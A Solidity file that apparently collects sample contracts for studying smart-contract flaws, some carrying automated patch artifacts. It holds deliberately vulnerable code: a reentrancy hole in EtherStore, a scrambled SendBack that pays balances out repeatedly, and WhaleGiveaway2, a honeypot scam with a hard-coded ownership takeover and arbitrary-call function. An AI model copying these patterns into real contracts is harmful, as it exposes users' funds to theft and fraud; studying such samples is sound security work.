pragma solidity ^0.4.26;
pragma solidity ^0.4.0;

contract sGuardPlus {
    constructor() internal {
        __lock_modifier101_lock = false;
        __owner = msg.sender;
    }

    function add_uint256(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    bool private __lock_modifier101_lock;
    modifier __lock_modifier101() {
        require(!__lock_modifier101_lock);
        __lock_modifier101_lock = true;
        _;
        __lock_modifier101_lock = false;
    }

    address internal __owner;
}

contract Reentrancy_bonus is sGuardPlus {
    mapping(address => uint256) private userBalances;
    mapping(address => bool) private claimedBonus;
    mapping(address => uint256) private rewardsForA;

    function withdrawReward(address recipient) public {
        uint256 amountToWithdraw = rewardsForA[recipient];
        rewardsForA[recipient] = 0;
        (bool success, ) = recipient.call.value(amountToWithdraw)("");
        require(success);
    }

    function getFirstWithdrawalBonus(address recipient)
        public
        __lock_modifier101
    {
        require(!claimedBonus[recipient]);
        rewardsForA[recipient] = add_uint256(rewardsForA[recipient], 100);
        withdrawReward(recipient);
        claimedBonus[recipient] = true;
    }
}

contract EtherStore {
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        require(_weiToWithdraw <= withdrawalLimit);
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        require(msg.sender.call.value(_weiToWithdraw)());
        lastWithdrawTime[msg.sender] = now;
    }
}

contract MyContract {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function sendTo(address receiver, uint256 amount) public {
        require(msg.sender == owner);
        receiver.transfer(amount);
    }
}

contract SendBack {
    mapping(address => uint256) userBalances;

    function withdrawBalance() {
        uint256 amountToWithdraw = userBalances[msg.sender];
        userBalances[msg.sender] = 0;
        bool __sent_result100 = msg.sender.send(amountToWithdraw);
        require(__sent_result100);
        bool s = msg.sender.send(amountToWithdraw);
        msg.sender.call.value(amountToWithdraw)("");
        bool s2 = msg.sender.call.value(amountToWithdraw)("");
    }
}

contract WhaleGiveaway2 {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }

        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        bool __sent_result101 = adr.call.value(msg.value)(data);
        require(__sent_result101);
    }
}

contract SimpleSuicide is sGuardPlus {
    function sudicideAnyone() {
        require(msg.sender == __owner);
        selfdestruct(msg.sender);
    }
}
